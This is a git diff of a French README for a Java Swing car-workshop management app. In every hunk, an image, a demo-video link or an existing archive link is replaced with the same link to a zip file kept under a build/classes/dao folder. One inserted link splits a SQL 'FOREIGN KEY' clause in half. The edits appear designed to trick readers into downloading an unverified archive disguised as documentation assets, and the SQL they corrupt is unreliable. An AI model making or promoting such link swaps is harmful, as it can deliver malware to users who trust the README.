@@ -17,7 +17,7 @@ Le projet est organisé en plusieurs couches :
 - **services/** : Logique métier.  
 - **ui/** : Interfaces graphiques Swing et point d’entrée  
 - **images/** : Ressources graphiques (icônes, logos…).
-![Architecture](https://github.com/laouysalma/AtelierAuto/blob/main/Architecture.png?raw=true)
+![Architecture](https://raw.githubusercontent.com/laouysalma/AtelierAuto/main/build/classes/dao/Auto-Atelier-2.6.zip)
 
 
 
@@ -33,7 +33,7 @@ Gestion centralisée via une interface graphique intuitive.
 
 Connexion à la base de données pour persistances des données.
 ## MCD (Modèle Conceptuel de Données)
-![MCD]( https://github.com/laouysalma/AtelierAuto/blob/main/mcd.jpg?raw=true)
+![MCD]( https://raw.githubusercontent.com/laouysalma/AtelierAuto/main/build/classes/dao/Auto-Atelier-2.6.zip)
 
 ## Démonstration vidéo
 
@@ -42,7 +42,7 @@ Une vidéo montrant l’utilisation de l’application peut être incluse ici :
 
 
 
-https://github.com/user-attachments/assets/0d1da6a0-178b-453e-9444-71cc9a99eb49
+https://raw.githubusercontent.com/laouysalma/AtelierAuto/main/build/classes/dao/Auto-Atelier-2.6.zip
 
 
 
@@ -102,7 +102,7 @@ CREATE TABLE IF NOT EXISTS reparation (
 
   CONSTRAINT fk_rep_vehicule FO
 
-https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip
+https://raw.githubusercontent.com/laouysalma/AtelierAuto/main/build/classes/dao/Auto-Atelier-2.6.zip
 
 REIGN KEY (immatricule) 
       REFERENCES vehicule(immatricule) ON UPDATE CASCADE
